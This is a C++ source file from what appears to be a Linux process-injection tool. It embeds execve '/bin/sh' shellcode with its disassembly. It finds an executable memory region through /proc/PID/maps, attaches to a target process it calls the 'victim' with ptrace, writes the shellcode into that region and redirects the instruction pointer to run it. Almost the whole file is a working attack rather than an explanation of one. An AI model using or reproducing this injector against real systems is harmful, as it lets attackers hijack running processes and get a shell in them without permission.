/* Copyright (C) 2021 Josh Schiavone - All Rights Reserved
 * You may use, distribute and modify this code under the
 * terms of the MIT license, which unfortunately won't be
 * written for another century.
 *
 * You should have received a copy of the MIT license with
 * this file. If not, visit : https://opensource.org/licenses/MIT
 */


#include "shellcode_inject.h"
#include "utility.h"

#pragma region ShellRegion

/*
Disassembly of __shellcode__
main:
    ;mov rbx, 0x68732f6e69622f2f
    ;mov rbx, 0x68732f6e69622fff
    ;shr rbx, 0x8
    ;mov rax, 0xdeadbeefcafe1dea
    ;mov rbx, 0xdeadbeefcafe1dea
    ;mov rcx, 0xdeadbeefcafe1dea
    ;mov rdx, 0xdeadbeefcafe1dea
    00000000  31C0              xor eax,eax
    00000002  48BBD19D9691D08C  mov rbx,0xff978cd091969dd1
             -97FF
    0000000C  48F7DB            neg rbx
    0000000F  53                push rbx
    00000010  54                push rsp
    00000011  5F                pop rdi
    00000012  99                cdq
    00000013  52                push rdx
    00000014  57                push rdi
    00000015  54                push rsp
    00000016  5E                pop rsi
    00000017  B03B              mov al,0x3b
    00000019  0F05              syscall

*/
_cchar* __shellcode__ = "\x31\xc0\x48\xbb\xd1\x9d\x96"
                        "\x91\xd0\x8c\x97\xff\x48\xf7"
                        "\xdb\x53\x54\x5f\x99\x52\x57"
                        "\x54\x5e\xb0\x3b\x0f\x05";

std::string max_process_id_file_path = "/proc/sys/kernel/pid_max";

char* SCI::Kernel::retrieve_machine_architecture() {
  if (uname(&utsbuffer) != K55_STANDARD_SUCCESS_CODE) {
    throw std::runtime_error("uname() - fatal");
  } else {
      return utsbuffer.machine;
  }
}

bool SCI::Kernel::retrieve_system_kernel_information() {
  n_buffer p;
  SCI::Kernel kn;

  if (uname(&utsbuffer) != K55_STANDARD_SUCCESS_CODE) {
    throw std::runtime_error("uname() - fatal");
    return false;
  } else {
    std::cout << "System Name: " << utsbuffer.sysname << '\n' <<
      "Node Name: " << utsbuffer.nodename << '\n' << "Release: " <<
      utsbuffer.release << '\n' << "Version: " << utsbuffer.version << '\n' <<
      "Machine: " << kn.retrieve_machine_architecture() << '\n';

#ifdef _GNU_SOURCE
    std::cout << "Domain Name: " << utsbuffer.domainname << '\n';
#endif
  }
  p = utsbuffer.release;
  while (*p) {
    if (std::isdigit(*p)) {
      version_buffer[v_counter] = std::strtol(p, &p, 10);
      v_counter++;
    } else {
        p++;
    }
  }
  std::cout << "Kernel: " << version_buffer[0] << " Major: " << version_buffer[1] << " Minor: " <<
    version_buffer[2] << " Patch: " << version_buffer[3] << '\n';
  return true;
}

template <typename _k55_type>
k55_process SCI::Process<_k55_type>::return_maximum_process_id(_k55_type proc) {

  default_status = cfg::n_invalid_var_any;

  std::ios_base::iostate handler = process_id_file.exceptions() | std::ios::failbit;
  process_id_file.exceptions(handler);

  try {
    process_id_file.open(max_process_id_file_path, std::ifstream::in);
  }
  catch (const std::ifstream::failure& e) {
    if (e.code() == std::make_error_condition(std::io_errc::stream)) {
      std::cerr << "File Stream Error\n";
#if defined(__x86_64__)
      return cfg::__x86_64_max_process_id_value__;
#endif
#if defined(__i386__)
      return cfg::__x86_max_process_id_value__;
#endif
    }
    else {
      std::cerr << e.what() << '\n';
#if defined(__x86_64__)
      return cfg::__x86_64_max_process_id_value__;
#endif
#if defined(__i386__)
      return cfg::__x86_max_process_id_value__;
#endif
    }
  }
  /*
    Dynamically allocate buffer space.
  */
  //char* pid_max_buffer = new (std::nothrow) char[PROCESS_ID_MAX_STRING_LENGTH * sizeof(char)];

  if (process_id_file.is_open()) {
    if (!std::getline(process_id_file, line, '\n')) {
      SET_DEBUG_VALUE(default_status, cfg::__n_read_directory_fatal__);
      std::cerr << "std::getline(pid_max, ...) - fatal\n";
      return K55_STANDARD_ERROR_CODE;
    }
  }

  max_process_id = std::atol(line.c_str());
  if (max_process_id == 0) {
    SET_DEBUG_VALUE(default_status, cfg::__n_value_parse_fatal__);
    std::cerr << "Cannot parse: " + max_process_id_file_path << '\n';

#if defined(__x86_64__)
      max_process_id = cfg::__x86_64_max_process_id_value__;
#endif
#if defined(__i386__)
      max_process_id = cfg::__x86_max_process_id_value__;
#endif
  }

  //delete[] pid_max_buffer;
  process_id_file.close();
  return max_process_id;
}

template <typename _k55_type>
_k55_type* SCI::Process<_k55_type>::return_file_permissions(_k55_type* process_line) {
  SCI::extension ext;
  default_status = cfg::n_invalid_var_any;

  for (std::size_t m = 0; m < strnlen(process_line, K55_MAX_STRING_LEN); m++) {
    if (process_line[m] == ' ' && process_space_a == -1) {
      process_space_a = m + 1;
    }
    else if (process_line[m] == ' ' && process_space_a != -1) {
      process_space_b = m;
      break;
    }
  }

  if (process_space_a != K55_STANDARD_ERROR_CODE && process_space_b != K55_STANDARD_ERROR_CODE
    && process_space_b > process_space_a) {

    ext.permissions = new (std::nothrow) char[process_space_b - process_space_a];
    if (ext.permissions == nullptr) {
      std::cerr << "nullptr exception\n";
      return NULL;
    }

    for (std::size_t m = process_space_a, j = 0; m < (std::size_t)process_space_b; m++, j++) {
      ext.permissions[j] = process_line[m];
    }
    ext.permissions[process_space_b - process_space_a] = '\0';
    return ext.permissions;
  }
  return NULL;
}

template <typename _k55_type>
long SCI::Parser<_k55_type>::retrieve_memory_address(_k55_type* line) {
  SCI::extension ext;
  default_status = cfg::n_invalid_var_any;

  for (std::size_t m = 0; m < strnlen(line, K55_MAX_STRING_LEN); m++) {
    if (line[m] == '-') {
      addr_last_occurance_line_index = m;
    }
  }

  if (addr_last_occurance_line_index == K55_STANDARD_ERROR_CODE) {
    SET_DEBUG_VALUE(default_status, cfg::__n_value_parse_fatal__);
    std::cerr << "Parsing our from line: " << line << '\n';
    return K55_STANDARD_ERROR_CODE;
  }

  _k55_type* addrline = new (std::nothrow) _k55_type[addr_last_occurance_line_index + 1];
  if (addrline == nullptr) {
    SET_DEBUG_VALUE(default_status, cfg::__n_heap_alloc_fatal__);
    std::cerr << "Dynamic Allocation - fatal\n";
    return K55_STANDARD_ERROR_CODE;
  }

  for (std::size_t m = 0; m <= (std::size_t)addr_last_occurance_line_index; m++) {
    addrline[m] = line[m];
  }

  ext.address = std::strtol(addrline, (char**)NULL, 16);
  // Set heap buffer to null
  delete[] addrline;
  return ext.address;
}

template <typename _k55_type>
_k55_type SCI::Parser<_k55_type>::parse_process_id_maps(_k55_type target_process_identifier) {

  SCI::Process<char> proc;

  SCI::Parser<char> parser;

  SCI::extension ext;

  default_status = cfg::n_invalid_var_any;

  name_length_file = PROCESS_ID_MAX_STRING_LENGTH + 12;
  // Allocate heap space for the file name of the proc map
  _k55_type* maps_file_name = reinterpret_cast<long int*> (new (std::nothrow) _k55_type[name_length_file]);
  //maps_f_name_path = std::string("/proc/") + std::string(target_process_identifier) + std::string("/maps");
  if (std::snprintf(reinterpret_cast<char*>(maps_file_name), name_length_file, "/proc/%ld/maps", target_process_identifier) < K55_STANDARD_SUCCESS_CODE) {
    SET_DEBUG_VALUE(default_status, cfg::__n_snprintf_fatal__);
    std::cerr << "snprint() - fatal\n";
    return K55_STANDARD_ERROR_CODE;
  }

  maps_file = fopen(reinterpret_cast<_cchar*>(maps_file_name), "r");
  if (maps_file == NULL) {
    std::cerr << "File cannot be opened at this time\n";
    return K55_STANDARD_ERROR_CODE;
  }

  std::size_t maps_line_length = 0;

  while (getline(reinterpret_cast<char**>(&maps_line), &maps_line_length, maps_file) != -1) {
    ext.permissions = proc.return_file_permissions(reinterpret_cast<char*> (maps_line));
    if (ext.permissions == NULL) {
      //ptruths->non_rxp = true;
      continue;
    } else if (strncmp("r-xp", ext.permissions, 4) == 0) {
        // Output & free mapped permissions
        std::cout << "-> Code Execution Allowed \n\t-> Mapped Permissions/Flags: " << ext.permissions << '\n';
        free(ext.permissions);
        break;
    }
    free(ext.permissions);
  }

  ext.address = parser.retrieve_memory_address(reinterpret_cast<char*> (maps_line));
  free(maps_line);

  return ext.address;

}

bool SCI::Injector::proc_inject(long target_process_identifier) {

  SCI::Process<bool> proc;
  SCI::Parser<long> parser;

  SCI::extension ext;
  SCI::Kernel kn;

  default_status = cfg::n_invalid_var_any;

  long pid_max = proc.return_maximum_process_id(true);
  long target_pid = target_process_identifier;

  UTL::Utility utl;

  if (utl.is_process_id_alive(target_pid) == false) {
      std::cerr << "Not a valid Process ID\n";
      return false;
  }

  if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < K55_STANDARD_SUCCESS_CODE) {
    SET_DEBUG_VALUE(default_status, cfg::__n_ptrace_attach_fatal__);
    std::cerr << "Cannot attach to victim\n";
    return false;
  } else {
      wait(NULL);
      std::cout << "-> Attached To Target Proc: " << target_pid << " - Max Process ID Allowed: " << pid_max << '\n';
  }

  SCI::ptruths ptruths;

  if (ptrace(PTRACE_GETREGS, target_pid, NULL, &old_regs) < K55_STANDARD_SUCCESS_CODE) {
    SET_DEBUG_VALUE(default_status, cfg::__n_get_registers_fatal__);
    std::cerr << "Cannot trace process registers\n";
    return false;
  }

  ext.address = parser.parse_process_id_maps(target_pid);

  payload_shell_size = strnlen(__shellcode__, K55_MAX_STRING_LEN);
  final_payload = (uint64_t *)__shellcode__;

  std::cout << "-> Injecting Shellcode (payload) @ 0x" << std::hex << ext.address << '\n';
  for (std::size_t m = 0; m < payload_shell_size; m += 8, final_payload++) {
    if (ptrace(PTRACE_POKETEXT, target_pid, ext.address + m, *final_payload) <= K55_STANDARD_ERROR_CODE) {
      SET_DEBUG_VALUE(default_status, cfg::__n_ptrace_poketext_fatal__);
      std::cerr << "Cannot Execute Payload In Address: 0x" << std::hex << ext.address << '\n';
      return false;
    }
    //ptruths.r_xp = true;

  }
  // Does not throw exceptions...
  std::memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
  std::cout << "-> Jumping to RIP Address @ " << reinterpret_cast<void*> (regs.rip) << '\n';
  // Set the 64-bit instrucion pointer to the mem address of execution
  regs.rip = ext.address;

  if (ptrace(PTRACE_SETREGS, target_pid, NULL, &regs) < K55_STANDARD_SUCCESS_CODE) {
    SET_DEBUG_VALUE(default_status, cfg::__n_set_registers_fatal__);
    std::cerr << "Cannot Setup " << kn.retrieve_machine_architecture() << " Registers for Tracing\n";
    return false;
  }

  // Stop execution at the next sys-exit call
  if (ptrace(PTRACE_CONT, target_pid, NULL, NULL) < K55_STANDARD_SUCCESS_CODE) {
    SET_DEBUG_VALUE(default_status, cfg::__n_ptrace_cont_syscall_fatal__);
    std::cerr << "ptrace_cont - fatal\n";
    return false;
  }

  std::cout << "-> Payload Was Successfully Executed" << '\n';

  return 0;
}
